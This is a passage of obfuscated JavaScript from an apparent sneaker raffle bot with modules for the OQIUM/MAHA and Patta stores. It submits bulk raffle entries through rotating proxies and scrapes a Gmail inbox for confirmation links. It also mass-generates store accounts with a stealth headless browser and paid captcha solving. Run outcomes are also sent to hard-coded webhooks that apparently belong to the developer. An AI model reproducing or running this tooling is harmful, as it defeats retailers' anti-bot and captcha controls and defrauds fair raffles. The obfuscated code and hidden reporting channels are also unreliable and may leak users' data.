                                _0x4e4e87['data']['attributes']['properties']['$first_name'] = '' + _0x22be9c[_0x3ca995]['FirstName'], _0x4e4e87['data']['attributes']['properties']['$last_name'] = '' + _0x22be9c[_0x3ca995]['LastName'], _0x4e4e87['data']['attributes']['properties']['$address1'] = _0x22be9c[_0x3ca995]['Address1'] + '\x20' + _0x22be9c[_0x3ca995]['Address2'] + '\x20' + _0x22be9c[_0x3ca995]['HouseNumber'], _0x4e4e87['data']['attributes']['properties']['$zip'] = '' + _0x22be9c[_0x3ca995]['Zip'], _0x4e4e87['data']['attributes']['properties']['$city'] = '' + _0x22be9c[_0x3ca995]['City'], _0x4e4e87['data']['attributes']['properties']['$country'] = '' + _0x22be9c[_0x3ca995]['Country'], _0x22be9c[_0x3ca995]['Size'] == 'RANDOM' ? _0x4e4e87['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3baa88[_0x2aca6d] : _0x4e4e87['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x22be9c[_0x3ca995]['Size'], _0x4e4e87['data']['attributes']['properties']['$phone_number'] = '' + _0x22be9c[_0x3ca995]['Phone'], _0x4e4e87['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x22be9c[_0x3ca995]['Follower'];
                            }
                            if (_0x15bf3f['useRandomProxy'] = ![])
                                var _0x5b9a33 = _0x29f488[_0x3ca995]['split'](':');
                            else
                                var _0x5212b2 = Math['round'](Math['random']() * (_0x29f488['length'] - 0x1)), _0x5b9a33 = _0x29f488[_0x5212b2]['split'](':');
                            var _0x14c1fe = {
                                'jar': _0x50eb26,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x5aca4b['url'],
                                'headers': _0x5aca4b['headers'],
                                'body': JSON['stringify'](_0x4e4e87),
                                'proxy': 'http://' + _0x5b9a33[0x2] + ':' + _0x5b9a33[0x3] + '@' + _0x5b9a33[0x0] + ':' + _0x5b9a33[0x1]
                            };
                            return _0x42d9e7 != 'ver' && (_0x14c1fe['url'] = _0x5aca4b['url'], _0x14c1fe['headers'] = _0x5aca4b['headers']), _0x42d9e7 == 'ver' && (_0x14c1fe['method'] = 'GET'), new Promise(function (_0x18c7dd, _0x1f5b65) {
                                callback = async (_0x117879, _0x4f994d, _0xc79d14) => {
                                    if (!_0x117879 && _0x4f994d['statusCode'] == 0xca || !_0x117879 && _0x4f994d['statusCode'] == 0xc8) {
                                        if (_0x42d9e7 != 'ver') {
                                            var _0x4d4075 = await _0x5c5001(_0x22be9c[_0x3ca995], _0x5aca4b, 'dev', ![]), _0x543cd0 = await _0x5c5001(_0x22be9c[_0x3ca995], _0x5aca4b, 'pub', ![]);
                                            const _0x5572f8 = {
                                                'succesDEVMSG': { 'embeds': [_0x4d4075] },
                                                'succesPUBMSG': { 'embeds': [_0x543cd0] }
                                            };
                                            if (_0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '')
                                                try {
                                                    await _0x4160b0(_0x15bf3f['webhook'], _0x5572f8['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x5572f8['succesDEVMSG']), await _0x37731a(0xc8);
                                            try {
                                                await _0x4160b0(_0xd6338c, _0x5572f8['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x5879e0(_0x22be9c[_0x3ca995], _0x5aca4b);
                                        }
                                        _0x18c7dd(console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x5aca4b['name'] + ']\x20Task\x20' + (_0x3ca995 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x42d9e7 != 'ver') {
                                            var _0x8275ee = '' + _0x117879, _0x4795f9 = await _0x5c5001(_0x22be9c[_0x3ca995], _0x5aca4b, 'dev', !![], _0x8275ee), _0x4b3678 = {};
                                            _0x4b3678['errorDEV'] = { 'embeds': [_0x4795f9] }, _0x17fcb0(_0x22be9c[_0x3ca995], _0x5aca4b), _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x4b3678['errorDEV']), await _0x4160b0(_0x3ce78e, _0x4b3678['errorDEV']);
                                        }
                                        _0x1f5b65(console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x5aca4b['name'] + ']\x20Task\x20' + (_0x3ca995 + 0x1) + ':\x20' + _0x117879)));
                                    }
                                };
                                try {
                                    _0x42d9e7 != 'ver' && console['log'](_0x1c7496() + '\x20[' + _0x5aca4b['name'] + ']\x20Task\x20' + (_0x3ca995 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4e4e87['data']['attributes']['email']), _0x5b6a7b(_0x14c1fe, callback);
                                } catch (_0x45da36) {
                                    console['log'](_0x1c7496() + '\x20Task\x20' + (_0x3ca995 + 0x1) + ':\x20' + _0x45da36);
                                }
                            });
                        }
                        ;
                        try {
                            await _0xcb12c2(_0x135fe5, 'nor', _0x1ae87b, _0x1a2a6e, _0x24db96), console['log'](_0x1c7496() + '\x20[' + _0x1ae87b['name'] + ']\x20Sleeping\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                        } catch (_0x9df8d4) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2264b5, _0x56bf10, _0x28d84e) {
                    var _0x56bf10 = [], _0x4dee50 = ![];
                    async function _0x5f123a() {
                        var _0x30045a = new _0x3451ed({
                            'user': _0x15bf3f['masterMail'],
                            'password': _0x15bf3f['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x3030d8(_0xc6c85c) {
                            _0x30045a['openBox']('INBOX', ![], _0xc6c85c);
                        }
                        _0x30045a['once']('ready', function () {
                            _0x3030d8(function (_0x51b1c3, _0x1c88b5) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x51b1c3)
                                    throw _0x51b1c3;
                                _0x30045a['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x15cd9f, _0x42488f) {
                                    if (!_0x42488f || !_0x42488f['length'])
                                        console['log'](_0x1c7496() + '\x20[' + _0x2264b5['name'] + ']\x20No\x20mails\x20found'), _0x30045a['end']();
                                    else {
                                        var _0x555e32 = _0x30045a['seq']['fetch'](_0x42488f, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x555e32['on']('message', function (_0x29a255, _0x58e1a9) {
                                            var _0x39c0a2 = '(#' + _0x58e1a9 + ')\x20';
                                            _0x29a255['on']('body', function (_0x18be84, _0x25d1b3) {
                                                _0x34a37a(_0x18be84, (_0x1c9316, _0x2e312a) => {
                                                    var _0x16a913 = _0x2e312a['text']['split']('(')[0x1], _0x124b26 = _0x16a913['split'](')')[0x0];
                                                    _0x56bf10['push'](_0x124b26);
                                                });
                                            }), _0x29a255['once']('end', function () {
                                            });
                                        }), _0x555e32['once']('error', function (_0x475dcf) {
                                            console['log']('Fetch\x20error:\x20' + _0x475dcf), _0x4dee50 = !![];
                                        }), _0x555e32['once']('end', function () {
                                            _0x30045a['end'](), _0x4dee50 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x30045a['once']('error', function (_0x45d60c) {
                            console['log'](_0x45d60c), _0x4dee50 = !![];
                        }), _0x30045a['once']('end', async function () {
                            _0x4dee50 = !![];
                        }), _0x30045a['connect']();
                    }
                    async function _0x25171d(_0x30dbd3, _0x374037, _0x40151d) {
                        for (var _0x1f7c75 = 0x0; _0x1f7c75 < _0x374037['length']; _0x1f7c75++) {
                            async function _0x31fce9(_0x84b5a4, _0x51e303, _0x4ccd21, _0x57d2c8, _0x3f37f8) {
                                var _0x11d82d, _0xa90f1e = {}, _0x493096 = [], _0x5a73d5 = {}, _0x1546c2 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x10900b = Math['round'](Math['random']() * (_0x1546c2['length'] - 0x1));
                                _0x57d2c8[_0x84b5a4]['Size'] == 'RANDOM' && (_0x57d2c8[_0x84b5a4]['Size'] = _0x1546c2[_0x10900b]);
                                !_0x57d2c8 && (_0x57d2c8 = {});
                                if (_0x15bf3f['useRandomProxy'] = ![])
                                    var _0x12204d = _0x3f37f8[_0x84b5a4]['split'](':');
                                else
                                    var _0x1b3e8a = Math['round'](Math['random']() * (_0x3f37f8['length'] - 0x1)), _0x12204d = _0x3f37f8[_0x1b3e8a]['split'](':');
                                var _0x501009 = {
                                    'jar': _0x50eb26,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x4ccd21['url'],
                                    'headers': _0x4ccd21['headers'],
                                    'body': JSON['stringify'](_0xa90f1e),
                                    'proxy': 'http://' + _0x12204d[0x2] + ':' + _0x12204d[0x3] + '@' + _0x12204d[0x0] + ':' + _0x12204d[0x1]
                                };
                                return _0x51e303 != 'ver' && (_0x501009['url'] = _0x4ccd21['url'], _0x501009['headers'] = _0x4ccd21['headers']), _0x51e303 == 'ver' && (_0x501009['method'] = 'GET', _0x501009['url'] = _0x57d2c8[_0x84b5a4]), new Promise(function (_0x5c2b4f, _0x2ed747) {
                                    callback = async (_0x55c079, _0x560107, _0x5da767) => {
                                        if (!_0x55c079 && _0x560107['statusCode'] == 0xca || !_0x55c079 && _0x560107['statusCode'] == 0xc8) {
                                            if (_0x51e303 != 'ver') {
                                                var _0x502a9c = await _0x5c5001(_0x57d2c8[_0x84b5a4], _0x4ccd21, 'dev', ![]), _0x2da3ee = await _0x5c5001(_0x57d2c8[_0x84b5a4], _0x4ccd21, 'pub', ![]);
                                                const _0x331c83 = {
                                                    'succesDEVMSG': { 'embeds': [_0x502a9c] },
                                                    'succesPUBMSG': { 'embeds': [_0x2da3ee] }
                                                };
                                                if (_0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '')
                                                    try {
                                                        await _0x4160b0(_0x15bf3f['webhook'], _0x331c83['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x331c83['succesDEVMSG']), await _0x37731a(0xc8);
                                                try {
                                                    await _0x4160b0(_0xd6338c, _0x331c83['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5879e0(_0x57d2c8[_0x84b5a4], _0x4ccd21);
                                            }
                                            _0x5c2b4f(console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x4ccd21['name'] + ']\x20Task\x20' + (_0x84b5a4 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x51e303 != 'ver') {
                                                var _0x57f985 = '' + _0x55c079, _0x2c47c6 = await _0x5c5001(_0x57d2c8[_0x84b5a4], _0x4ccd21, 'dev', !![], _0x57f985), _0x308e51 = {};
                                                _0x308e51['errorDEV'] = { 'embeds': [_0x2c47c6] }, _0x17fcb0(_0x57d2c8[_0x84b5a4], _0x4ccd21), _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x308e51['errorDEV']), await _0x4160b0(_0x3ce78e, _0x308e51['errorDEV']);
                                            }
                                            _0x2ed747(console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x4ccd21['name'] + ']\x20Task\x20' + (_0x84b5a4 + 0x1) + ':\x20' + _0x55c079)));
                                        }
                                    };
                                    try {
                                        _0x51e303 != 'ver' ? console['log'](_0x1c7496() + '\x20[' + _0x4ccd21['name'] + ']\x20Task\x20' + (_0x84b5a4 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xa90f1e['data']['attributes']['email']) : console['log'](_0x1c7496() + '\x20[' + _0x4ccd21['name'] + ']\x20Task\x20' + (_0x84b5a4 + 0x1) + ':\x20Fetching\x20Response'), _0x5b6a7b(_0x501009, callback);
                                    } catch (_0x268598) {
                                        console['log'](_0x1c7496() + '\x20Task\x20' + (_0x84b5a4 + 0x1) + ':\x20' + _0x268598);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x31fce9(_0x1f7c75, 'ver', _0x30dbd3, _0x374037, _0x40151d), console['log'](_0x1c7496() + '\x20[' + _0x30dbd3['name'] + ']\x20Sleeping\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                            } catch (_0x7663fb) {
                            }
                        }
                    }
                    try {
                        _0x5f123a();
                        while (!_0x4dee50) {
                            await _0x37731a(0xfa0);
                        }
                        console['log']('Found\x20' + _0x56bf10['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x25171d(_0x2264b5, _0x56bf10, _0x28d84e);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x48c39d, _0x24c4c1, _0x27ea05) {
                    _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x15bf3f['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x143a9a = 0x0; _0x143a9a < _0x24c4c1['length']; _0x143a9a++) {
                        var _0x2f163b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x6362be
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x15bf3f['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2bd99c
                                }
                            ]
                        }];
                        const _0x45a69a = { 'embeds': _0x2f163b };
                        _0x57fa03(_0x48c39d['name'] + '\x20Task\x20' + (_0x143a9a + 0x1) + '\x20/\x20' + _0x24c4c1['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
                        try {
                            await _0x412246(_0x24c4c1, _0x143a9a);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x420733 = await _0x5c5001(_0x24c4c1[_0x143a9a], _0x48c39d, 'acc', ![]);
                        const _0x1e9cc7 = { 'succesDEVMSG': { 'embeds': [_0x420733] } };
                        if (_0x24c4c1[_0x143a9a]['Email'] == '' || _0x24c4c1[_0x143a9a]['FirstName'] == '' || _0x24c4c1[_0x143a9a]['LastName'] == '') {
                            console['log'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x143a9a + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x37731a(0x7d0);
                            continue;
                        }
                        (_0x24c4c1[_0x143a9a]['Password'] == '' || _0x24c4c1[_0x143a9a] == undefined) && _0x24c4c1[_0x143a9a]['Password'] == 'JRaffles23!';
                        if (_0x15bf3f['useRandomProxy'] = ![])
                            var _0x383b51 = _0x27ea05[_0x143a9a]['split'](':');
                        else
                            var _0x1a8968 = Math['round'](Math['random']() * (_0x27ea05['length'] - 0x1)), _0x383b51 = _0x27ea05[_0x1a8968]['split'](':');
                        const _0x74a4fe = await _0x3df2da['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x383b51[0x0] + ':' + _0x383b51[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0xce3b41 = await _0x74a4fe['newPage']();
                            await _0xce3b41['authenticate']({
                                'username': '' + _0x383b51[0x2],
                                'password': '' + _0x383b51[0x3]
                            }), console['log'](_0x1c7496() + '\x20[' + _0x48c39d['name'] + ']\x20Task\x20' + (_0x143a9a + 0x1) + '\x20:\x20Getting\x20Session'), await _0xce3b41['setRequestInterception'](!![]), _0xce3b41['on']('request', _0x3cd32a => {
                                _0x3cd32a['resourceType']() === 'image' || _0x3cd32a['resourceType']() === 'font' || _0x3cd32a['resourceType']() === 'media' ? _0x3cd32a['abort']() : _0x3cd32a['continue']();
                            }), await _0xce3b41['goto']('https://patta.nl/account/register'), await _0x37731a(0xbb8), await _0xce3b41['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x1c7496() + '\x20[' + _0x48c39d['name'] + ']\x20Task\x20' + (_0x143a9a + 0x1) + '\x20:\x20Filling\x20information'), await _0xce3b41['type']('#RegisterForm-FirstName', '' + _0x24c4c1[_0x143a9a]['FirstName']), await _0x37731a(0x226), await _0xce3b41['type']('#RegisterForm-LastName', '' + _0x24c4c1[_0x143a9a]['LastName']), await _0x37731a(0x226), await _0xce3b41['type']('#RegisterForm-email', '' + _0x24c4c1[_0x143a9a]['Email']), await _0x37731a(0x226), await _0xce3b41['type']('#RegisterForm-password', '' + _0x24c4c1[_0x143a9a]['Password']), await _0x37731a(0x226), console['log'](_0x1c7496() + '\x20[' + _0x48c39d['name'] + ']\x20Task\x20' + (_0x143a9a + 0x1) + '\x20:\x20Submitting..'), await _0xce3b41['$eval']('#RegisterForm', _0x357ef2 => _0x357ef2['submit']()), await _0x37731a(0x1f40);
                            try {
                                await _0xce3b41['waitForSelector']('.home-page-grid__collection'), await _0x37731a(0x1f4), console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x48c39d['name'] + ']\x20Task\x20' + (_0x143a9a + 0x1) + '\x20:\x20Account\x20' + _0x24c4c1[_0x143a9a]['Email'] + '\x20Generated!')), _0x241ca2['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x24c4c1[_0x143a9a]['Email'] + ',' + _0x24c4c1[_0x143a9a]['Password']), console['log'](_0x7ff36['yellow'](_0x1c7496() + '\x20[' + _0x48c39d['name'] + ']\x20Task\x20' + (_0x143a9a + 0x1) + '\x20:\x20Account\x20' + _0x24c4c1[_0x143a9a]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x1e9cc7['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4160b0(_0x14c79a, _0x1e9cc7['succesDEVMSG']);
                            } catch (_0x160eeb) {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x143a9a + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x160eeb));
                            }
                        } catch (_0x16eb5f) {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x143a9a + 0x1) + '\x20:\x20' + _0x16eb5f));
                        } finally {
                            _0x74a4fe && _0x74a4fe['close'](), console['log']('Waiting\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x4ca020, _0xfbfe6d, _0x1d18ec) {
                    _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x15bf3f['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3ef08b = 0x0; _0x3ef08b < _0xfbfe6d['length']; _0x3ef08b++) {
                        var _0x38d5c2;
                        if (_0x33f3a3 != 'yes')
                            var _0x33f3a3 = '', _0x19352f = 0x0;
                        _0x57fa03(_0x4ca020['name'] + '\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20/\x20' + _0xfbfe6d['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
                        try {
                            await _0x412246(_0xfbfe6d, _0x3ef08b);
                        } catch {
                            _0x33f3a3 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0xfbfe6d[_0x3ef08b]['Email'] == '' || _0xfbfe6d[_0x3ef08b]['Password'] == '' || _0xfbfe6d[_0x3ef08b]['FirstName'] == '' || _0xfbfe6d[_0x3ef08b]['LastName'] == '') {
                            console['log'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x15bf3f['useRandomProxy'] = ![])
                            var _0x2d4956 = _0x1d18ec[_0x3ef08b]['split'](':');
                        else
                            var _0x4691b5 = Math['round'](Math['random']() * (_0x1d18ec['length'] - 0x1)), _0x2d4956 = _0x1d18ec[_0x4691b5]['split'](':');
                        const _0x429015 = await _0x3df2da['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x2d4956[0x0] + ':' + _0x2d4956[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x34c48d = await _0x429015['newPage']();
                            await _0x34c48d['authenticate']({
                                'username': '' + _0x2d4956[0x2],
                                'password': '' + _0x2d4956[0x3]
                            }), console['log'](_0x1c7496() + '\x20[' + _0x4ca020['name'] + ']\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x34c48d['setRequestInterception'](!![]), _0x34c48d['on']('request', _0x41f828 => {
                                _0x41f828['resourceType']() === 'image' || _0x41f828['resourceType']() === 'font' || _0x41f828['resourceType']() === 'media' ? _0x41f828['abort']() : _0x41f828['continue']();
                            }), await _0x34c48d['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x34c48d['waitForSelector']('#CustomerEmail'), console['log'](_0x1c7496() + '\x20[' + _0x4ca020['name'] + ']\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20:\x20Logging\x20in..'), await _0x34c48d['type']('#CustomerEmail', '' + _0xfbfe6d[_0x3ef08b]['Email']), await _0x37731a(0x12c), await _0x34c48d['type']('#CustomerPassword', '' + _0xfbfe6d[_0x3ef08b]['Password']), await _0x37731a(0x226), await _0x34c48d['$eval']('#customer_login', _0x2d5bc2 => _0x2d5bc2['submit']());
                            try {
                                await _0x34c48d['waitForSelector']('#orders'), await _0x37731a(0x4b0);
                            } catch {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x4ca020['name'] + ']\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x34c48d['goto']('' + _0xfbfe6d[_0x3ef08b]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x37731a(0xbb8), console['log'](_0x1c7496() + '\x20[' + _0x4ca020['name'] + ']\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x34c48d['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x4ca020['name'] + ']\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x34c48d['type']('#email', '' + _0xfbfe6d[_0x3ef08b]['Email']), await _0x37731a(0x384), await _0x34c48d['type']('#first_name', '' + _0xfbfe6d[_0x3ef08b]['FirstName']), await _0x37731a(0x514), await _0x34c48d['type']('#last_name', '' + _0xfbfe6d[_0x3ef08b]['LastName']), await _0x37731a(0x514), await _0x34c48d['type']('#street_address', _0xfbfe6d[_0x3ef08b]['Address1'] + '\x20' + _0xfbfe6d[_0x3ef08b]['HouseNumber'] + '\x20' + _0xfbfe6d[_0x3ef08b]['Address2']), await _0x37731a(0x2bc);
                            _0xfbfe6d[_0x3ef08b]['Postcode'] == undefined && (_0xfbfe6d[_0x3ef08b]['Postcode'] = _0xfbfe6d[_0x3ef08b]['Zip']);
                            await _0x34c48d['type']('#zip_code', '' + _0xfbfe6d[_0x3ef08b]['Postcode']), await _0x37731a(0x320), await _0x34c48d['type']('#city', '' + _0xfbfe6d[_0x3ef08b]['City']), await _0x37731a(0x320), await _0x34c48d['type']('#bday', '01/01/1994'), await _0x37731a(0x320), await _0x34c48d['type']('#instagram', '' + _0xfbfe6d[_0x3ef08b]['Follower']), await _0x37731a(0x352);
                            if (_0xfbfe6d[_0x3ef08b]['Size'] == 'RANDOM') {
                                const _0x499e5c = await _0x34c48d['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x5563e2 => {
                                    return _0x5563e2['map'](_0x3dfb9f => _0x3dfb9f['textContent']);
                                });
                                var _0x434c20 = Math['round'](Math['random']() * (_0x499e5c['length'] - 0x1));
                                console['log'](_0x1c7496() + '\x20[' + _0x4ca020['name'] + ']\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x499e5c[_0x434c20]), await _0x34c48d['click']('label[data-eu-size=\x22' + _0x499e5c[_0x434c20] + '\x22]');
                            } else {
                                console['log'](_0x1c7496() + '\x20[' + _0x4ca020['name'] + ']\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0xfbfe6d[_0x3ef08b]['Size']);
                                try {
                                    await _0x34c48d['click']('label[data-eu-size=\x22' + _0xfbfe6d[_0x3ef08b]['Size'] + '\x22]');
                                } catch {
                                    await _0x34c48d['click']('label[data-eu-size=\x22' + _0xfbfe6d[_0x3ef08b]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x37731a(0xbb8), await _0x34c48d['$$eval']('.raffle__checkbox-label', _0x153e66 => _0x153e66['forEach'](_0x211850 => _0x211850['click']())), await _0x37731a(0x7d0), console['log'](_0x1c7496() + '\x20[' + _0x4ca020['name'] + ']\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x34c48d['click']('#raffle__form-submit'), await _0x37731a(0x1388);
                            try {
                                await _0x34c48d['waitForSelector']('#raffle__confirmation-message-container'), _0x33f3a3 = 'no', _0x5879e0(_0xfbfe6d[_0x3ef08b], _0x4ca020), console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x4ca020['name'] + ']\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x1e1bce) {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x1e1bce));
                            }
                        } catch (_0x4b8b11) {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20:\x20' + _0x4b8b11)), _0x33f3a3 = 'yes';
                        } finally {
                            _0x429015 && _0x429015['close']();
                            if (_0x33f3a3 == 'yes' && _0x19352f != 0x5 && _0x38d5c2 != 'Size\x20Not\x20Found') {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x4ca020['name'] + ']\x20Task\x20' + (_0x3ef08b + 0x1) + '\x20:\x20Retrying\x20(' + _0x19352f + '\x20/\x205)')), _0x3ef08b = _0x3ef08b - 0x1, _0x19352f = _0x19352f + 0x1;
                                continue;
                            }
